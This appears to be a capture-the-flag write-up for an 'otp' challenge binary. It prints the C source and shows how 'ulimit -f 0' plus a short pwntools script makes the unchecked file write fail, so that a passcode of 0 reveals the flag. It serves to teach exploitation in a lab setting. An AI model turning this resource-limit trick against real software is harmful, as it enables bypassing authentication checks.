```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
	char fname[128];
	unsigned long long otp[2];

	if(argc!=2){
		printf("usage : ./otp [passcode]\n");
		return 0;
	}

	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1) exit(-1);

	if(read(fd, otp, 16)!=16) exit(-1);
	close(fd);

	sprintf(fname, "/tmp/%llu", otp[0]);
	FILE* fp = fopen(fname, "w");
	if(fp==NULL){ exit(-1); }
	fwrite(&otp[1], 8, 1, fp);
	fclose(fp);

	printf("OTP generated.\n");

	unsigned long long passcode=0;
	FILE* fp2 = fopen(fname, "r");
	if(fp2==NULL){ exit(-1); }
	fread(&passcode, 8, 1, fp2);
	fclose(fp2);

	if(strtoul(argv[1], 0, 16) == passcode){
		printf("Congratz!\n");
		system("/bin/cat flag");
	}
	else{
		printf("OTP mismatch\n");
	}

	unlink(fname);
	return 0;
}
```

Code is simple.

It safely gets random 16 bytes, writes a file from them, and reads the file.

Prohibiting the program to write file is enough to solve this problem.

There are fopen check routines, but there is no check routine about actual file writing.

```bash
ulimit -f 0
```

This ulimit command limits programs to write file.

Therefore, the program cannot write any content into file, and it recieves SIGXFSZ signal.

Without any settings, "./otp 0" will be terminated with that signal.

If that signal is bypassed with other program, fread's return value may be zero.

Bypass code is below

```python
from pwn import *
p = process(['./otp', '0'])
p.interactive()
```
